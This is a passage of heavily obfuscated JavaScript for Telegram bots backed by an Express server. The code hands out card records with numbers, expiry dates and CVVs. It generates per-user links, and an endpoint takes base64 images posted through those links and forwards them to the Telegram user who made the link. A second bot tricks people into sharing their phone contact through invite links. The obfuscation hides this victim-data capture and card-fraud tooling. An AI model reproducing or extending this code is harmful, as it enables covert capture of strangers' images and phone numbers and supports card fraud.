                    if (_0xf17b3[_0x5c38e1(0x268)](_0x583e84[_0x5c38e1(0x475)], 0x23fb * -0x1 + 0x12ff + -0x80 * -0x22))
                        return {
                            'CardNumber': _0x583e84[-0x18b * 0x14 + 0xc2 * -0xd + -0x6c9 * -0x6],
                            'Expiry': _0x583e84[-0x7 * -0x556 + -0x1 * -0x39a + -0x28f3] + '/' + _0x583e84[0xf5e + -0x3 * -0x65b + -0x226d],
                            'CVV': _0x583e84[0x1 * 0xd75 + 0x1b8d + -0x28ff],
                            'Bank': americanBanks[Math[_0x5c38e1(0x32d)](_0xf17b3[_0x5c38e1(0x129)](Math[_0x5c38e1(0x1ed)](), americanBanks[_0x5c38e1(0x475)]))],
                            'CardType': _0xf17b3[_0x5c38e1(0x41b)],
                            'Country': _0xf17b3[_0x5c38e1(0x430)],
                            'Value': '$' + _0xf17b3[_0x5c38e1(0x365)](Math[_0x5c38e1(0x32d)](_0xf17b3[_0x5c38e1(0x129)](Math[_0x5c38e1(0x1ed)](), -0x12e4 + -0x2 * -0x269 + 0x3 * 0x4bb)), 0xf14 + 0x35 * 0x59 + -0xd * 0x293)
                        };
                })[_0x195378(0x2e9)](Boolean);
                if (_0xf17b3[_0x195378(0x570)](_0x491ce4[_0x195378(0x475)], 0x48 * -0x22 + -0x12ed + 0x1c7d))
                    return _0x491ce4[Math[_0x195378(0x32d)](_0xf17b3[_0x195378(0x129)](Math[_0x195378(0x1ed)](), _0x491ce4[_0x195378(0x475)]))];
            }
            return console[_0x195378(0x3c6)](_0xf17b3[_0x195378(0x479)]), null;
        } catch (_0x3b9cdb) {
            return console[_0x195378(0x3c6)](_0xf17b3[_0x195378(0x3b9)], _0x3b9cdb[_0x195378(0x641)]), null;
        }
    };
bot[_0x1155f9(0x2bb)](/\/نكخمنتته/, _0x4fe551 => {
    const _0xb6caa0 = _0x1155f9, _0x2b9fbe = {
            'KvYlM': _0xb6caa0(0x241) + _0xb6caa0(0x48a),
            'MmigK': _0xb6caa0(0x4ee) + _0xb6caa0(0x48a),
            'cLUzw': _0xb6caa0(0x42c),
            'herVH': _0xb6caa0(0x142) + _0xb6caa0(0x660) + _0xb6caa0(0x16e) + _0xb6caa0(0x4aa) + _0xb6caa0(0x3a7) + _0xb6caa0(0x3ef) + _0xb6caa0(0x43e)
        }, _0x423c0b = _0x4fe551[_0xb6caa0(0x12c)]['id'], _0x23ac58 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x2b9fbe[_0xb6caa0(0x67e)],
                            'callback_data': _0x2b9fbe[_0xb6caa0(0x277)]
                        }]]
            },
            'parse_mode': _0x2b9fbe[_0xb6caa0(0x51b)]
        };
    bot[_0xb6caa0(0x420) + 'e'](_0x423c0b, _0x2b9fbe[_0xb6caa0(0x4a2)], _0x23ac58);
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), async _0x62e87a => {
    const _0x3eef25 = _0x1155f9, _0x14d5d7 = {
            'HGGdR': function (_0x5380ec, _0x3b7745) {
                return _0x5380ec === _0x3b7745;
            },
            'pMerV': _0x3eef25(0x4ee) + _0x3eef25(0x48a),
            'GTjpW': _0x3eef25(0x578) + _0x3eef25(0x148) + _0x3eef25(0x1e1) + _0x3eef25(0x111),
            'hFeDr': _0x3eef25(0x578) + _0x3eef25(0x148) + _0x3eef25(0x6a3) + _0x3eef25(0x48c),
            'fhQAU': _0x3eef25(0x578) + _0x3eef25(0x148) + _0x3eef25(0x352) + _0x3eef25(0x25a),
            'jsWPR': _0x3eef25(0x578) + _0x3eef25(0x148) + _0x3eef25(0x5e6) + _0x3eef25(0x22f),
            'Juaez': _0x3eef25(0x578) + _0x3eef25(0x148) + _0x3eef25(0x1b9) + _0x3eef25(0x52e),
            'xCuBv': function (_0x1a0d86) {
                return _0x1a0d86();
            },
            'ApBVt': _0x3eef25(0x42c),
            'KsXfC': _0x3eef25(0x11a) + _0x3eef25(0x1b3) + _0x3eef25(0x518) + _0x3eef25(0x499) + _0x3eef25(0x67a)
        }, _0x20d204 = _0x62e87a[_0x3eef25(0x641)][_0x3eef25(0x12c)]['id'];
    if (_0x14d5d7[_0x3eef25(0x24f)](_0x62e87a[_0x3eef25(0x628)], _0x14d5d7[_0x3eef25(0x5bf)])) {
        let _0x541326 = await bot[_0x3eef25(0x420) + 'e'](_0x20d204, _0x14d5d7[_0x3eef25(0x5a2)]);
        await new Promise(_0x598df9 => setTimeout(_0x598df9, 0x1 * 0x148d + -0xd0c + -0x399)), await bot[_0x3eef25(0x4ff) + _0x3eef25(0x62b)](_0x14d5d7[_0x3eef25(0x503)], {
            'chat_id': _0x20d204,
            'message_id': _0x541326[_0x3eef25(0x10f)]
        }), await new Promise(_0x40875e => setTimeout(_0x40875e, -0x2d0 + 0x13f6 + -0xd3e)), await bot[_0x3eef25(0x4ff) + _0x3eef25(0x62b)](_0x14d5d7[_0x3eef25(0x1c9)], {
            'chat_id': _0x20d204,
            'message_id': _0x541326[_0x3eef25(0x10f)]
        }), await new Promise(_0x4376d0 => setTimeout(_0x4376d0, -0x11c5 * 0x1 + 0x1e7 + 0x13c6)), await bot[_0x3eef25(0x4ff) + _0x3eef25(0x62b)](_0x14d5d7[_0x3eef25(0x424)], {
            'chat_id': _0x20d204,
            'message_id': _0x541326[_0x3eef25(0x10f)]
        }), await new Promise(_0x2f6f96 => setTimeout(_0x2f6f96, -0x4 * 0x539 + 0x2692 + 0xdc6 * -0x1)), await bot[_0x3eef25(0x4ff) + _0x3eef25(0x62b)](_0x14d5d7[_0x3eef25(0x673)], {
            'chat_id': _0x20d204,
            'message_id': _0x541326[_0x3eef25(0x10f)]
        }), await new Promise(_0x35eed6 => setTimeout(_0x35eed6, -0xe * -0x3c + -0x58 + 0x1 * 0xf8)), await bot[_0x3eef25(0x378) + _0x3eef25(0x579)](_0x20d204, _0x541326[_0x3eef25(0x10f)]);
        const _0x3c2c3d = await _0x14d5d7[_0x3eef25(0x33f)](fetchVisaData);
        if (_0x3c2c3d) {
            const {
                CardNumber: _0x1d65fc,
                Expiry: _0x593ef1,
                CVV: _0x1188c1,
                Bank: _0x1ba760,
                CardType: _0x1e1a92,
                Country: _0x271075,
                Value: _0x387677
            } = _0x3c2c3d;
            bot[_0x3eef25(0x420) + 'e'](_0x20d204, _0x3eef25(0x64b) + _0x3eef25(0x681) + _0x3eef25(0xe1) + '`' + _0x1d65fc + (_0x3eef25(0x257) + _0x3eef25(0x3da)) + _0x593ef1 + (_0x3eef25(0x470) + _0x3eef25(0xba)) + _0x1188c1 + (_0x3eef25(0x3d4) + _0x3eef25(0x28a)) + _0x1ba760 + (_0x3eef25(0x203) + _0x3eef25(0x18c) + '`') + _0x1e1a92 + (_0x3eef25(0x50b) + _0x3eef25(0x530)) + _0x271075 + (_0x3eef25(0x3dd) + _0x3eef25(0x39d)) + _0x387677 + (_0x3eef25(0x63d) + _0x3eef25(0x428) + _0x3eef25(0x428) + _0x3eef25(0x60c) + _0x3eef25(0x5d1) + _0x3eef25(0x3b5) + _0x3eef25(0x16c)), { 'parse_mode': _0x14d5d7[_0x3eef25(0x1d7)] });
        } else
            bot[_0x3eef25(0x420) + 'e'](_0x20d204, _0x14d5d7[_0x3eef25(0x1b5)]);
    }
});
const deleteFolderRecursive = _0xdce93 => {
    const _0x3851da = _0x1155f9, _0x3dee4f = {
            'MhiMU': function (_0x2cee6f, _0x1b5fab) {
                return _0x2cee6f(_0x1b5fab);
            }
        };
    fs[_0x3851da(0x513)](_0xdce93) && (fs[_0x3851da(0x36c) + 'c'](_0xdce93)[_0x3851da(0x243)](_0x346999 => {
        const _0x14ba58 = _0x3851da, _0x554974 = path[_0x14ba58(0x33d)](_0xdce93, _0x346999);
        fs[_0x14ba58(0x627)](_0x554974)[_0x14ba58(0x224) + 'y']() ? _0x3dee4f[_0x14ba58(0x541)](deleteFolderRecursive, _0x554974) : fs[_0x14ba58(0x21b)](_0x554974);
    }), fs[_0x3851da(0x217)](_0xdce93));
};
app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x69f)](_0x1155f9(0x2c9), (_0x25b299, _0x357ea6) => {
    const _0x58be2b = _0x1155f9, _0x14cda4 = {
            'tDBis': _0x58be2b(0x363),
            'RrdHU': function (_0x432b96, _0x65aede) {
                return _0x432b96 + _0x65aede;
            },
            'NQwgs': _0x58be2b(0x175),
            'beqat': _0x58be2b(0x644)
        }, _0x359daa = _0x25b299[_0x58be2b(0x496)][_0x58be2b(0x35d)], _0x4877d0 = _0x25b299[_0x58be2b(0x496)][_0x58be2b(0x34e)][_0x58be2b(0xc1)](','), _0x2abb44 = path[_0x58be2b(0x33d)](__dirname, _0x14cda4[_0x58be2b(0x62e)]);
    !fs[_0x58be2b(0x513)](_0x2abb44) && fs[_0x58be2b(0x400)](_0x2abb44), _0x4877d0[_0x58be2b(0x243)]((_0x5524e2, _0x3de7ce) => {
        const _0x51c5ce = _0x58be2b, _0x6ce01b = Buffer[_0x51c5ce(0x112)](_0x5524e2, _0x14cda4[_0x51c5ce(0x231)]), _0x5ae7db = path[_0x51c5ce(0x33d)](_0x2abb44, _0x359daa + '_' + _0x3de7ce + _0x51c5ce(0x37b));
        fs[_0x51c5ce(0x575) + _0x51c5ce(0x621)](_0x5ae7db, _0x6ce01b), bot[_0x51c5ce(0x49f)](_0x359daa, _0x6ce01b, { 'caption': _0x51c5ce(0x1b8) + _0x14cda4[_0x51c5ce(0x606)](_0x3de7ce, -0xc0f + -0x1328 + 0x1f38) });
    }), console[_0x58be2b(0x3c6)](_0x58be2b(0x2c1) + _0x58be2b(0x174) + _0x58be2b(0x333) + _0x58be2b(0x347) + _0x359daa), _0x357ea6[_0x58be2b(0x446)](_0x14cda4[_0x58be2b(0x13f)]);
}), app[_0x1155f9(0x45b)](_0x1155f9(0x190), (_0x4193a3, _0x145027) => {
    const _0x24a312 = _0x1155f9, _0x5a68d9 = { 'kFDHQ': _0x24a312(0x21f) };
    _0x145027[_0x24a312(0x13a)](path[_0x24a312(0x33d)](__dirname, _0x5a68d9[_0x24a312(0x676)]));
}), bot[_0x1155f9(0x2bb)](/\/اتتهتتاههة/, _0x2f15aa => {
    const _0x1f1336 = _0x1155f9, _0x1d4732 = {
            'vWVAC': _0x1f1336(0x12e) + _0x1f1336(0x334) + _0x1f1336(0x590) + _0x1f1336(0x5a5) + _0x1f1336(0x258) + _0x1f1336(0x53b),
            'yJAfP': _0x1f1336(0x556) + _0x1f1336(0x55c) + _0x1f1336(0x251),
            'Frdkl': _0x1f1336(0x44d) + _0x1f1336(0x350)
        }, _0xdc991f = _0x2f15aa[_0x1f1336(0x12c)]['id'], _0x144d4a = _0x1d4732[_0x1f1336(0x228)];
    bot[_0x1f1336(0x420) + 'e'](_0xdc991f, _0x144d4a, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x1d4732[_0x1f1336(0x3e3)],
                        'callback_data': _0x1d4732[_0x1f1336(0xf0)]
                    }]]
        }
    });
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x13cca6 => {
    const _0x3e1ace = _0x1155f9, _0x1bfaaf = {
            'UxGvz': function (_0x5a4934, _0x59b974) {
                return _0x5a4934 === _0x59b974;
            },
            'AoaPk': _0x3e1ace(0x44d) + _0x3e1ace(0x350)
        }, _0x3bace7 = _0x13cca6[_0x3e1ace(0x641)][_0x3e1ace(0x12c)]['id'], _0x3c5f0b = _0x13cca6[_0x3e1ace(0x641)][_0x3e1ace(0x10f)];
    if (_0x1bfaaf[_0x3e1ace(0x6bb)](_0x13cca6[_0x3e1ace(0x628)], _0x1bfaaf[_0x3e1ace(0x218)])) {
        const _0x478a51 = baseUrl + (_0x3e1ace(0x359) + _0x3e1ace(0x54b)) + _0x3bace7;
        bot[_0x3e1ace(0x420) + 'e'](_0x3bace7, _0x3e1ace(0x464) + _0x3e1ace(0x2d0) + _0x3e1ace(0x4c9) + _0x478a51);
    }
}), bot[_0x1155f9(0x2bb)](/\/s2854تصخصrt/, _0x39cae5 => {
    const _0x2e6aef = _0x1155f9, _0x4c88b5 = {
            'HkCnB': _0x2e6aef(0x2c3) + _0x2e6aef(0x34d),
            'ORoMf': _0x2e6aef(0x1cd) + 'il',
            'bcBsN': _0x2e6aef(0xda)
        }, _0x568ba4 = _0x39cae5[_0x2e6aef(0x12c)]['id'], _0x270d2e = _0x39cae5[_0x2e6aef(0x112)], _0x38af43 = _0x270d2e[_0x2e6aef(0x6af)], _0x889769 = {
            'inline_keyboard': [[{
                        'text': _0x4c88b5[_0x2e6aef(0x1c8)],
                        'callback_data': _0x4c88b5[_0x2e6aef(0x14e)]
                    }]]
        };
    bot[_0x2e6aef(0x420) + 'e'](_0x568ba4, _0x2e6aef(0x1b1) + _0x2e6aef(0x4a9) + _0x38af43 + (_0x2e6aef(0x57d) + _0x2e6aef(0x467) + _0x2e6aef(0x6ce) + _0x2e6aef(0x31f) + _0x2e6aef(0x409) + _0x2e6aef(0x26e) + _0x2e6aef(0x309) + _0x2e6aef(0x1fb) + _0x2e6aef(0xfd) + 'g>'), {
        'parse_mode': _0x4c88b5[_0x2e6aef(0x42f)],
        'reply_markup': { 'inline_keyboard': _0x889769[_0x2e6aef(0x3f7) + _0x2e6aef(0x2a0)] }
    });
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x3e3155 => {
    const _0x167ae9 = _0x1155f9, _0x43f9cd = {
            'EDEXL': function (_0x4c9d5b, _0x74d232) {
                return _0x4c9d5b === _0x74d232;
            },
            'TCEnH': _0x167ae9(0x1cd) + 'il',
            'qhvlt': _0x167ae9(0xda)
        }, _0x4e6a54 = _0x3e3155[_0x167ae9(0x641)][_0x167ae9(0x12c)]['id'], _0x2be761 = _0x3e3155[_0x167ae9(0x628)];
    _0x43f9cd[_0x167ae9(0x526)](_0x2be761, _0x43f9cd[_0x167ae9(0xde)]) && bot[_0x167ae9(0x420) + 'e'](_0x4e6a54, _0x167ae9(0x373) + _0x167ae9(0x4ed) + _0x167ae9(0x2ff) + _0x167ae9(0x272) + _0x167ae9(0x67c) + _0x167ae9(0x583) + _0x167ae9(0x6b7) + _0x167ae9(0x26c) + _0x167ae9(0x551) + _0x167ae9(0x6be) + _0x167ae9(0xe3) + _0x167ae9(0x5c2) + _0x167ae9(0x16f) + _0x167ae9(0x202) + _0x167ae9(0x581) + _0x167ae9(0x437) + _0x167ae9(0x233) + _0x167ae9(0xf6) + _0x167ae9(0x44f) + _0x167ae9(0x2ae) + _0x167ae9(0x536) + _0x167ae9(0xb1) + _0x167ae9(0x191) + _0x167ae9(0x5e7) + _0x167ae9(0x4ad) + _0x167ae9(0x687) + _0x167ae9(0xf9), { 'parse_mode': _0x43f9cd[_0x167ae9(0x18b)] });
});
const EMAILS_FILE = _0x1155f9(0x1bb) + 'n';
function readEmails() {
    const _0x2f4f77 = _0x1155f9, _0x276cbe = { 'biMif': _0x2f4f77(0x5a6) };
    try {
        const _0x29f524 = fs[_0x2f4f77(0x55d) + 'nc'](EMAILS_FILE, _0x276cbe[_0x2f4f77(0x311)]);
        return JSON[_0x2f4f77(0x4c1)](_0x29f524);
    } catch (_0x1e0d76) {
        return {};
    }
}
function writeEmails(_0x3ffd57) {
    const _0x279978 = _0x1155f9;
    fs[_0x279978(0x575) + _0x279978(0x621)](EMAILS_FILE, JSON[_0x279978(0x155)](_0x3ffd57, null, 0x7be + 0x147f * 0x1 + 0x1 * -0x1c3b));
}
bot[_0x1155f9(0x2bb)](/\/email/, async _0x1950d5 => {
    const _0x1444c8 = _0x1155f9, _0x19f5ec = {
            'aQyRP': function (_0x57eb56) {
                return _0x57eb56();
            },
            'tKLFt': _0x1444c8(0x2a9) + _0x1444c8(0x5a8) + _0x1444c8(0x1a4) + _0x1444c8(0x576),
            'VLXVk': _0x1444c8(0xda),
            'fKmTu': _0x1444c8(0x527) + _0x1444c8(0x133) + _0x1444c8(0xed) + _0x1444c8(0x33b) + _0x1444c8(0x376),
            'UYFvf': _0x1444c8(0xd9),
            'sruPZ': _0x1444c8(0x3d6) + _0x1444c8(0x33e),
            'knszT': _0x1444c8(0x47b) + _0x1444c8(0x601),
            'GvJnx': function (_0x37c41b, _0x4d1ded) {
                return _0x37c41b(_0x4d1ded);
            },
            'DDbrr': _0x1444c8(0x2ec) + _0x1444c8(0x45a) + _0x1444c8(0x39f) + 'g>'
        }, _0x47471a = _0x1950d5[_0x1444c8(0x112)]['id'], _0x1668d4 = _0x1950d5[_0x1444c8(0x12c)]['id'];
    let _0x5b4e84 = _0x19f5ec[_0x1444c8(0x4bf)](readEmails);
    _0x5b4e84[_0x47471a] && delete _0x5b4e84[_0x47471a];
    try {
        bot[_0x1444c8(0x420) + 'e'](_0x1668d4, _0x19f5ec[_0x1444c8(0xcf)], { 'parse_mode': _0x19f5ec[_0x1444c8(0x2a7)] });
        const _0x401e0a = await axios[_0x1444c8(0x69f)](_0x19f5ec[_0x1444c8(0x472)], {
                'name': _0x19f5ec[_0x1444c8(0x490)],
                'domain': _0x19f5ec[_0x1444c8(0x265)]
            }, { 'headers': { 'User-Agent': _0x19f5ec[_0x1444c8(0x453)] } }), _0x4068fc = _0x401e0a[_0x1444c8(0x628)][_0x1444c8(0x6aa)];
        _0x5b4e84[_0x47471a] = _0x4068fc, _0x19f5ec[_0x1444c8(0xcc)](writeEmails, _0x5b4e84), bot[_0x1444c8(0x420) + 'e'](_0x1668d4, _0x1444c8(0x4eb) + _0x1444c8(0xd4) + _0x1444c8(0x5dc) + _0x1444c8(0x3d1) + _0x1444c8(0x2db) + _0x4068fc + (_0x1444c8(0x57f) + _0x1444c8(0x57a) + _0x1444c8(0x584) + _0x1444c8(0x484) + _0x1444c8(0x507)), { 'parse_mode': _0x19f5ec[_0x1444c8(0x2a7)] });
    } catch (_0x3a7593) {
        bot[_0x1444c8(0x420) + 'e'](_0x1668d4, _0x19f5ec[_0x1444c8(0xf7)], { 'parse_mode': _0x19f5ec[_0x1444c8(0x2a7)] });
    }
}), bot[_0x1155f9(0x2bb)](/\/an/, _0xe45c69 => {
    const _0x50adc5 = _0x1155f9, _0x22d910 = {
            'nIFNr': function (_0x4c9ebf) {
                return _0x4c9ebf();
            },
            'jwbrV': _0x50adc5(0xda),
            'ZneGB': _0x50adc5(0x591) + _0x50adc5(0x648) + _0x50adc5(0x6c4) + _0x50adc5(0x278) + 'g>'
        }, _0x3b4ee6 = _0xe45c69[_0x50adc5(0x12c)]['id'], _0x2e6852 = _0xe45c69[_0x50adc5(0x112)]['id'];
    let _0x345d8a = _0x22d910[_0x50adc5(0x13d)](readEmails);
    if (_0x345d8a[_0x2e6852]) {
        const _0x18b682 = _0x345d8a[_0x2e6852];
        bot[_0x50adc5(0x420) + 'e'](_0x3b4ee6, _0x50adc5(0x2e6) + _0x50adc5(0x469) + _0x50adc5(0x1c3) + _0x50adc5(0x4f4) + _0x50adc5(0x348) + _0x50adc5(0x125) + _0x18b682 + (_0x50adc5(0x57f) + _0x50adc5(0x57a) + _0x50adc5(0x584) + _0x50adc5(0x484) + _0x50adc5(0x507)), { 'parse_mode': _0x22d910[_0x50adc5(0x21a)] });
    } else
        bot[_0x50adc5(0x420) + 'e'](_0x3b4ee6, _0x22d910[_0x50adc5(0x481)], { 'parse_mode': _0x22d910[_0x50adc5(0x21a)] });
}), bot[_0x1155f9(0x2bb)](/\/Messages/, async _0x509e23 => {
    const _0x40e17b = _0x1155f9, _0x576c23 = {
            'txUBW': _0x40e17b(0xda),
            'uwPKR': function (_0x3b16fa) {
                return _0x3b16fa();
            },
            'GnQrQ': function (_0x1c436e, _0x3c9f9a) {
                return _0x1c436e > _0x3c9f9a;
            },
            'CpKER': _0x40e17b(0x54f) + _0x40e17b(0x5cf) + _0x40e17b(0x113),
            'isaMl': _0x40e17b(0x274) + _0x40e17b(0x282) + _0x40e17b(0x538) + _0x40e17b(0x3c4) + 'g>',
            'brQGp': _0x40e17b(0x5e2) + _0x40e17b(0x58a) + _0x40e17b(0x48e) + _0x40e17b(0x520)
        }, _0x5e882f = _0x509e23[_0x40e17b(0x12c)]['id'], _0x5706b5 = _0x509e23[_0x40e17b(0x112)]['id'];
    let _0x615909 = _0x576c23[_0x40e17b(0x4af)](readEmails);
    if (_0x615909[_0x5706b5]) {
        const _0x1e1a30 = _0x615909[_0x5706b5];
        try {
            const _0x49ac87 = await axios[_0x40e17b(0x45b)](_0x40e17b(0x527) + _0x40e17b(0x133) + _0x40e17b(0xed) + _0x40e17b(0x33b) + _0x40e17b(0xbb) + _0x1e1a30 + _0x40e17b(0xbd)), _0x57e3f7 = _0x49ac87[_0x40e17b(0x628)];
            _0x576c23[_0x40e17b(0x626)](_0x57e3f7[_0x40e17b(0x475)], 0x1c3f * 0x1 + 0x67f + -0x115f * 0x2) ? _0x57e3f7[_0x40e17b(0x243)](_0x1f76b0 => {
                const _0x672116 = _0x40e17b;
                bot[_0x672116(0x420) + 'e'](_0x5e882f, _0x672116(0xc7) + _0x672116(0x120) + _0x672116(0x4c6) + '\x0a' + _0x1f76b0[_0x672116(0x3cf)] + '\x0a' + _0x1f76b0[_0x672116(0x124)] + _0x672116(0xd2), { 'parse_mode': _0x576c23[_0x672116(0x568)] });
            }) : bot[_0x40e17b(0x420) + 'e'](_0x5e882f, _0x576c23[_0x40e17b(0x312)]);
        } catch (_0x316ffd) {
            bot[_0x40e17b(0x420) + 'e'](_0x5e882f, _0x576c23[_0x40e17b(0x23f)], { 'parse_mode': _0x576c23[_0x40e17b(0x568)] });
        }
    } else
        bot[_0x40e17b(0x420) + 'e'](_0x5e882f, _0x576c23[_0x40e17b(0x1c6)], { 'parse_mode': _0x576c23[_0x40e17b(0x568)] });
}), bot[_0x1155f9(0x2bb)](/\/de/, _0x44f898 => {
    const _0x1cf4cd = _0x1155f9, _0x174955 = {
            'qlvAf': function (_0x29141d) {
                return _0x29141d();
            },
            'LXXGK': function (_0x3726a7, _0x52a193) {
                return _0x3726a7(_0x52a193);
            },
            'DRgEV': _0x1cf4cd(0x4eb) + _0x1cf4cd(0x2d7) + _0x1cf4cd(0x2aa) + '>',
            'nJNHL': _0x1cf4cd(0xda),
            'vBjeU': _0x1cf4cd(0x4ea) + _0x1cf4cd(0x381) + _0x1cf4cd(0xc0) + _0x1cf4cd(0x520)
        }, _0x3f8fd8 = _0x44f898[_0x1cf4cd(0x12c)]['id'], _0x8d2b13 = _0x44f898[_0x1cf4cd(0x112)]['id'];
    let _0x32e97b = _0x174955[_0x1cf4cd(0x5ba)](readEmails);
    _0x32e97b[_0x8d2b13] ? (delete _0x32e97b[_0x8d2b13], _0x174955[_0x1cf4cd(0x3c7)](writeEmails, _0x32e97b), bot[_0x1cf4cd(0x420) + 'e'](_0x3f8fd8, _0x174955[_0x1cf4cd(0x394)], { 'parse_mode': _0x174955[_0x1cf4cd(0x643)] })) : bot[_0x1cf4cd(0x420) + 'e'](_0x3f8fd8, _0x174955[_0x1cf4cd(0x3fb)], { 'parse_mode': _0x174955[_0x1cf4cd(0x643)] });
}), bot[_0x1155f9(0x2bb)](/\/de/, async _0x120326 => {
    const _0x551b15 = _0x1155f9, _0x4c2e38 = {
            'ektRC': _0x551b15(0x4eb) + _0x551b15(0x2d7) + _0x551b15(0x2aa) + '>',
            'ixcuX': _0x551b15(0xda),
            'WfaBr': _0x551b15(0x4ea) + _0x551b15(0x649) + _0x551b15(0x3c0) + _0x551b15(0x520)
        }, _0x1b0059 = _0x120326[_0x551b15(0x12c)]['id'];
    try {
        fs[_0x551b15(0x21b)](_0x551b15(0x5ed) + _0x1b0059 + _0x551b15(0x455)), bot[_0x551b15(0x420) + 'e'](_0x1b0059, _0x4c2e38[_0x551b15(0x131)], { 'parse_mode': _0x4c2e38[_0x551b15(0x3b8)] });
    } catch (_0x3c5cad) {
        bot[_0x551b15(0x420) + 'e'](_0x1b0059, _0x4c2e38[_0x551b15(0x181)], { 'parse_mode': _0x4c2e38[_0x551b15(0x3b8)] });
    }
}), bot[_0x1155f9(0x2bb)](/\/sخسننسمس/, _0xe49e3e => {
    const _0x50af12 = _0x1155f9, _0x463215 = {
            'ZIHrl': _0x50af12(0x1e2) + _0x50af12(0x1ff),
            'ytSQk': _0x50af12(0x443) + _0x50af12(0x6d0),
            'hveXc': _0x50af12(0x462) + _0x50af12(0x1de) + _0x50af12(0x5db) + _0x50af12(0x22c)
        }, _0xc6c3ae = _0xe49e3e[_0x50af12(0x12c)]['id'], _0xfccf58 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x463215[_0x50af12(0x3f4)],
                            'callback_data': _0x463215[_0x50af12(0x21c)]
                        }]]
            }
        };
    bot[_0x50af12(0x420) + 'e'](_0xc6c3ae, _0x463215[_0x50af12(0x321)], _0xfccf58);
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x2e2d3f => {
    const _0xae2f9b = _0x1155f9, _0xc4d0c7 = {
            'HfPzx': function (_0x5580a1, _0x20f571) {
                return _0x5580a1 === _0x20f571;
            },
            'kVCku': _0xae2f9b(0x443) + _0xae2f9b(0x6d0)
        };
    if (_0xc4d0c7[_0xae2f9b(0x3e8)](_0x2e2d3f[_0xae2f9b(0x628)], _0xc4d0c7[_0xae2f9b(0x5b5)])) {
        const _0xdd437e = _0x2e2d3f[_0xae2f9b(0x112)]['id'], _0x2b427e = _0xae2f9b(0x61d) + _0xae2f9b(0x276) + _0xae2f9b(0x59c) + _0xae2f9b(0x1e6) + _0xdd437e;
        bot[_0xae2f9b(0x420) + 'e'](_0x2e2d3f[_0xae2f9b(0x641)][_0xae2f9b(0x12c)]['id'], _0xae2f9b(0x3f3) + _0xae2f9b(0x3fa) + _0xae2f9b(0x2d5) + _0xae2f9b(0x38a) + _0xae2f9b(0x10b) + _0xae2f9b(0x343) + ':\x0a' + _0x2b427e);
    }
}), secondBot[_0x1155f9(0x2bb)](/\/start (.+)/, (_0x4711b6, _0x417470) => {
    const _0x336bac = _0x1155f9, _0x1f8ba7 = {
            'ercpQ': function (_0x21bc60, _0x4d8cc0) {
                return _0x21bc60(_0x4d8cc0);
            },
            'EjmCV': _0x336bac(0x4be) + _0x336bac(0x1c5),
            'sPISG': _0x336bac(0x27d) + _0x336bac(0x537) + _0x336bac(0x549) + _0x336bac(0x5b9) + _0x336bac(0x5ae)
        }, _0x52fd9a = _0x4711b6[_0x336bac(0x12c)]['id'], _0x4dced5 = _0x1f8ba7[_0x336bac(0x19a)](parseInt, _0x417470[-0xd * -0x1f7 + -0xfd1 * -0x1 + -0x295b]);
    inviteLinks[_0x4711b6[_0x336bac(0x112)]['id']] = _0x4dced5;
    const _0x121fac = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x1f8ba7[_0x336bac(0x1a7)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x336bac(0x420) + 'e'](_0x52fd9a, _0x1f8ba7[_0x336bac(0x408)], _0x121fac);
}), secondBot['on'](_0x1155f9(0x280), _0x4043ab => {
    const _0x18ba49 = _0x1155f9, _0x2d1123 = {
            'QCosd': function (_0x259bfa, _0x537b82) {
                return _0x259bfa + _0x537b82;
            },
            'nFhbD': function (_0x31549d, _0x766f5a) {
                return _0x31549d + _0x766f5a;
            },
            'Chohn': function (_0x46d700, _0x260d55) {
                return _0x46d700 + _0x260d55;
            },
            'rrXBL': function (_0x20f124, _0x5cbfee) {
                return _0x20f124 > _0x5cbfee;
            },
            'Oqyre': _0x18ba49(0x42c),
            'UQlVm': _0x18ba49(0x250) + _0x18ba49(0x5a7),
            'zWRpq': function (_0x448cc6, _0x9adb84) {
                return _0x448cc6 === _0x9adb84;
            },
            'lzntX': _0x18ba49(0x34a) + _0x18ba49(0xb8),
            'RyWZe': _0x18ba49(0x17f) + 'ذة',
            'NdnnC': _0x18ba49(0x27d) + _0x18ba49(0x537) + _0x18ba49(0x410) + _0x18ba49(0x505),
            'NibGb': _0x18ba49(0x27e) + _0x18ba49(0x38f) + _0x18ba49(0x637)
        };
    if (_0x4043ab[_0x18ba49(0x280)] && inviteLinks[_0x4043ab[_0x18ba49(0x112)]['id']]) {
        if (_0x2d1123[_0x18ba49(0x5da)](_0x4043ab[_0x18ba49(0x280)][_0x18ba49(0x620)], _0x4043ab[_0x18ba49(0x112)]['id'])) {
            const _0x56dd7c = inviteLinks[_0x4043ab[_0x18ba49(0x112)]['id']], _0x237376 = _0x4043ab[_0x18ba49(0x112)], _0x3c5308 = _0x237376['id'], _0x5c587a = _0x237376[_0x18ba49(0x6af)], _0x37123d = _0x237376[_0x18ba49(0x54c)] || '', _0x38b9ed = _0x237376[_0x18ba49(0x6b5)] || _0x2d1123[_0x18ba49(0x384)], _0x25cbbe = _0x237376[_0x18ba49(0x51a)] || _0x2d1123[_0x18ba49(0x589)];
            secondBot[_0x18ba49(0x655) + _0x18ba49(0x689)](_0x3c5308)[_0x18ba49(0x23e)](_0x18b072 => {
